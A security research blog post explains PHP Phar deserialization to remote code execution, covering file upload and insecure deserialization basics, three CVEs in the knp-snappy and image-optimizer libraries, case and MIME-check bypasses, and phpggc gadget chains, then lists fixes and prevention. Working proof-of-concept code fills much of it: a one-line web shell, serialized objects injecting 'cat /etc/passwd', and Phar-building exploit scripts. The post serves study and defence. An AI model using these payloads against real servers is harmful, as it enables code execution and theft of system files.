---
title: "Phar Deserialization leads to RCE"
description: "Phar Deserialization leads to RCE"
summary: "Phar Deserialization leads to RCE"
categories: ["Research"]
tags: ["PHP", "Phar", "Deserialization", "Web"]
#externalUrl: ""
date: 2025-08-07
draft: false
cover: ../../post/phar-deserialization/feature.png
authors:
  - winky
---

## Introduction

**Phar Deserialization** is a popular bug related to file upload vulnerability and unsafe object deserialization. While this issue is mostly resolved in the latest PHP versions, some functions can still trigger it and pose a risk to our server.

### Phar

**PHAR - PHP Archive** are like JARs of Java but for PHP, compatible with 3 formats (Phar, Tar, Zip). In other words, PHAR is a form of compressing PHP application into a single executable file. A Phar file can be loaded using phar wrapper phar:// . For example: `phar://relative/path/to/phar/file.xyz/.inc`. A Phar file consists of 4 parts:

* Stub: The first part includes PHP code, ending with **__HALT_COMPILER();**
* Manifest: The manifest details the contents of the archive (**object** type)
* File Contents: The original files that are included in the archive
* Signature: A hash verifying the PHAR integrity

![image](https://hackmd.io/_uploads/HJpzbTWOxx.png)

This is the detailed structure of this file

![image](https://hackmd.io/_uploads/By2TMa-uxl.png)

### How to make a phar file

A simple template to make a Phar file is

```php
<?php
class User {
	public $name = "winky";
	public $age = 18;
}
$obj = new User();
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->stopBuffering();
?>
```

In this code, stub is `<?php __HALT_COMPILER(); ?>`, manifest or Phar Metadata is $obj (new User class) and file contents is text from test.txt file. Now we can build it with a simple command:

`php -d phar.readonly=0 phar.php`

What is phar.readonly ? For security, this setting will allow us to create and modify using phar stream, by default this is enable: [phar.readonly option](https://www.php.net/manual/en/phar.configuration.php#:~:text=the%20configuration%20directives.-,phar.readonly%20bool,-This%20option%20disables)

### File upload vulnerability

File upload vulnerability or [CWE-434](https://cwe.mitre.org/data/definitions/434.html) is a common weakness in a web server. A user may upload unexpected or non-standard files, which can alter the server’s behavior and potentially lead to serious issues such as Remote Code Execution (RCE). POC:

A user can upload a simple shell if the server don't strictly filter it

```php
<?php
system($_GET["cmd"]);
?>
```

And we can run php file in apache server

![image](https://hackmd.io/_uploads/Hybbt6bdll.png)


### Insecure Deserialization

Insecure Deserialization or [CWE-502](https://cwe.mitre.org/data/definitions/502.html) covers insecure deserialization of untrusted data. Attackers can manipulate serialized objects to execute arbitrary code, especially using magic methods like __wakeup(), __destruct(), and __toString().

POC:

Imagine we have a simple class that will create a JSON file based on the $name argument passed to the class.

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

$a = new User('winky', 18);
?>
```
![image](https://hackmd.io/_uploads/r1scipbOgg.png)

By using unserialize() function we can override $func and $name thereby get RCE

```php
<?php

class User{
    public $name = "; cat /etc/passwd ;";
    public $age;
    public $func = "system";
}

$ser = new User();
echo serialize($ser);
// O:4:"User":3:{s:4:"name";s:19:"; cat /etc/passwd ;";s:3:"age";N;s:4:"func";s:6:"system";}
?>
```

![image](https://hackmd.io/_uploads/BkNQ1RZuee.png)


## Phar Deserialization

In PHP <= 7.4, many file-related functions will automatically deserialize a Phar's metadata if accessed via phar://. Those functions are 

![image](https://hackmd.io/_uploads/rynpNRZdel.png)

and move_uploaded_file, mime_content_type, etc.

POC: 

If I use the previous context and create a PHAR file like:

```php
<?php

class User{
    public $name = "; cat /etc/passwd ;";
    public $age;
    public $func = "system";
}

$obj = new User();
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->stopBuffering();

?>
```

You can use one of the functions mentioned above to trigger it — for example, filesize()

PHP8:

![image](https://hackmd.io/_uploads/SJAAdA-Ogx.png)

PHP7.4:

![image](https://hackmd.io/_uploads/HkRjKA-ull.png)

=> So this bug is still present in PHP 7.4 and has been fixed in PHP 8.

## CVE-2023-28115 and CVE-2023-41330

Both CVEs have a high score of 9.8 according to Snyk.

![image](https://hackmd.io/_uploads/HJpU9R-_lx.png)


![image](https://hackmd.io/_uploads/r1dV48oPeg.png)

### knplabs/knp-snappy

This is a PHP library for converting an HTML website to a PDF file. We can use this library like this:

```php
<?php

require __DIR__ . '/vendor/autoload.php';

use Knp\Snappy\Pdf;

$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');
$snappy->generateFromHtml('<h1>Hello</h1>', 'a.pdf');
```

### Vulnerable function

From version 1.4.1 and earlier, the generateFromHtml() function calls ([file_exist function in Snappy](https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670)). So, what happens if we pass a phar:// wrapper stream to it?

### POC

This bug requires PHP 7.4. Using the previous context, we can write vulneable code like this:

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

require __DIR__ . '/vendor/autoload.php';

use Knp\Snappy\Pdf;

$snappy = new Pdf('/usr/bin/wkhtmltopdf');
try{
    $snappy->generateFromHtml('<h1>Hello</h1>', 'phar://test.phar');
}catch(\Exception $e){}
?>
```

![image](https://hackmd.io/_uploads/SkQDbJz_gl.png)

### Is it fixed?

This patch was committed on the version 1.4.2 to fix CVE-2023-28115: [CVE-2023-28115 fix](https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6)

![image](https://hackmd.io/_uploads/HkLAW1MOxl.png)

But the bug is still there. This is because the wrapper scheme is case-insensitive, according to [RFC 3986](https://datatracker.ietf.org/doc/html/rfc3986#section-6.2.2.1) Therefore, we can use an uppercase wrapper — for example, PHAR://.

![image](https://hackmd.io/_uploads/SJ8B7yGuxx.png)


If the vulnerable code uses strpos() for wrapper checks without normalizing the case, the check becomes bypassable. So, using PHAR:// instead of phar:// allows us to bypass the filter.

POC:

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

require __DIR__ . '/vendor/autoload.php';

use Knp\Snappy\Pdf;

$snappy = new Pdf('/usr/bin/wkhtmltopdf');
try{
    $snappy->generateFromHtml('<h1>Hello</h1>', 'PHAR://test.phar');
}catch(\Exception $e){}
?>
```

![image](https://hackmd.io/_uploads/rkOjQkzdll.png)

And this is CVE-2023-41330. After that a commit to use parse_url on version 1.4.3 have fixed both above CVE

[CVE-2023-41330 fix](https://github.com/KnpLabs/snappy/commit/d3b742d61a68bf93866032c2c0a7f1486128b67e)

## CVE-2024-34515

![image](https://hackmd.io/_uploads/BJnU48sDle.png)

### image-optimizer

[image-optimizer](https://github.com/spatie/image-optimizer) is a PHP library for optimizing images, especially if they are large. The simple syntax is:

```php
<?php
require __DIR__ . '/vendor/autoload.php';

use Spatie\ImageOptimizer\OptimizerChainFactory;

$optimizerChain = OptimizerChainFactory::create();

$pathToImage = "./a.png";

$optimizerChain->optimize($pathToImage);
?>
```

### Vulnerable function

In version 1.7.2, the optimize() function uses this function to check whether the image exists. https://github.com/Sonicrrrr/image-optimizer/blob/284a082b1814a846560ee1c91360bbdf3b4cb885/src/Image.php#L19

And it also triggers phar deserialization

### POC

```php
<?php
class User{
    private $name;
    private $age;
    private $func = "touch";
    function __construct($name, $age){
        $this->name = $name;
        $this->age = $age;
    }
    function __destruct(){
        call_user_func( $this->func, 'user/'.$this->name.'.json' );
    }
}

require __DIR__ . '/vendor/autoload.php';

use Spatie\ImageOptimizer\OptimizerChainFactory;

$optimizerChain = OptimizerChainFactory::create();

$pathToImage = "phar://test.phar";

$optimizerChain->optimize($pathToImage);
?>
```

There are lots of warnings, but it still results in RCE on the server.

![image](https://hackmd.io/_uploads/HyblPJMOlg.png)

### Challenge

I also made a challenge related to this CVE and uploaded it in Dreamhack: [optimizer](https://dreamhack.io/wargame/challenges/2166)

## Phar image?

Phar deserialization in PHP does not depend on the file extension. That means even if we rename a .phar file, the vulnerability still works.

POC:

![image](https://hackmd.io/_uploads/rJ1jukG_le.png)

However, you can't use a file without a proper extension (e.g., test, abc, or test,abc), because PHP functions like pathinfo() rely on file extensions to determine behavior.

`Rename the file with a valid image extension (like .gif, .png, etc.) while keeping the internal structure as a Phar. => Bypass the pathinfo() function`

We can also bypass mime_content_type() checks by adding fake image magic bytes (e.g., for a GIF file) in the Phar stub. Here's how:

```php
$obj = new User();
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF89A<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($obj);
$phar->stopBuffering();
```

![image](https://hackmd.io/_uploads/HJ8zx4Gule.png)

`Add appropriate magic bytes to fool MIME detection. => Bypass the mime_content_type() function`

## Phar deserialization and gadget chains

This bug still works in PHP 7.4 so can be combined with vulnerabilities in older libraries like Monolog, Laravel, Symfony, etc. Those libraries often contain gadget chains that can be abused for RCE via deserialization.You can find a collection of known gadget chains here: https://github.com/ambionics/phpggc

How to Exploit Phar Deserialization with PHPGGC ? 

### Using the CLI tool 

* First, clone the phpggc repository:
* Next, generate a Phar file with a gadget chain using this command
`phpggc -f Monolog/RCE1 exec 'touch pwned' -p phar -o exploit.phar`
* Now you can work with it

![image](https://hackmd.io/_uploads/rJe9a1fOex.png)

You can notice that there are two files was created exploit.phar and pwned 

### Manually

* Choose your gadget chain, for example [monolog/RCE1](https://github.com/ambionics/phpggc/tree/master/gadgetchains/Monolog/RCE/1)
* Use both files chain.php and gadgets.php in directory
* Update chain.php to the following:

```php
<?php

require './gadgets.php';

function generate(array $parameters)
{
    $function = $parameters['function'];
    $parameter = $parameters['parameter'];

    return new \Monolog\Handler\SyslogUdpHandler(
        new \Monolog\Handler\BufferHandler(
            ['current', $function],
            [$parameter, 'level' => null]
        )
    );
}

$p = array();
$p['function'] = 'system';
$p['parameter'] = 'cat /etc/passwd';
$obj = generate($p);

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($obj);
$phar->stopBuffering();
```

Now use `php -d phar.readonly=0 chain.php` to create phar file and you will get RCE

![image](https://hackmd.io/_uploads/rkkZayzOxl.png)


## Fixing

Starting from PHP 8, this Phar deserialization bug is no longer exploitable in the same way. https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar

Pull Request for the fix: [php/php-src#5855](https://github.com/php/php-src/pull/5855/commits/28417b781c5f112c667b596957289f752ee99259)

However, the Phar::getMetadata() function still performs unserialize() on the internal metadata — so you must be careful when using this function, especially with user-controlled input.

![image](https://hackmd.io/_uploads/Sy_rW4Mdgx.png)

## Prevention

+ Upgrade to PHP8
+ Filter and validate stream wrappers
+ Be careful when work with Phar::getMetadata() function
+ Harden file upload locations
+ Set phar.readonly = 1 in php.ini

## References

* https://nhienit.wordpress.com/2020/12/12/khai-thac-lo-hong-phar-deserialize/
* https://sec.vnpt.vn/2019/08/ky-thuat-khai-thac-lo-hong-phar-deserialization
* https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/
* https://srcincite.io/assets/out-of-hand-attacks-against-php-environments.pdf
* https://www.synacktiv.com/ressources/modern_php_security_sec4dev.pdf
* https://www.sonarsource.com/blog/phpbb3-phar-deserialization-to-remote-code-execution/
